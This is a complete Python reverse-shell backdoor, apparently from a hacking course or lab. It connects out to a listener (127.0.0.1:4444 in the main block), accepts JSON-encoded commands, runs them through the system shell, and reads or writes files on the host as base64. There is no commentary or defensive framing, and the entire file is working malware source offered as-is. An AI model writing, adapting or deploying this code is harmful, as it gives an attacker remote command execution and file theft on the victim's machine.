#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        if isinstance(data, bytes):
            data = data.decode('utf-8', errors='ignore')
        json_data = json.dumps(data)
        if hasattr(json_data, 'encode'):
            json_data = json_data.encode('utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                chunk = self.connection.recv(1024)
                json_data = json_data + chunk
                return json.loads(json_data.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                continue

    def execute_system_command(self, command):
        output = subprocess.check_output(command, shell=True)
        if isinstance(output, bytes):
            return output.decode('utf-8', errors='ignore')
        return output

    def change_working_directory_to(self, path):
        os.chdir(path)
        return '[+] Changing Directory To ' + path

    def read_file(self, path):
        with open(path, 'rb') as file:
            encoded = base64.b64encode(file.read())
            if hasattr(encoded, 'decode'):
                encoded = encoded.decode('utf-8')
            return encoded

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload successfull.'

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = '[-] Error during command execution: ' + str(e)
            self.reliable_send(command_result)
if __name__ == '__main__':
    my_backdoor = Backdoor('127.0.0.1', 4444)
    my_backdoor.run()
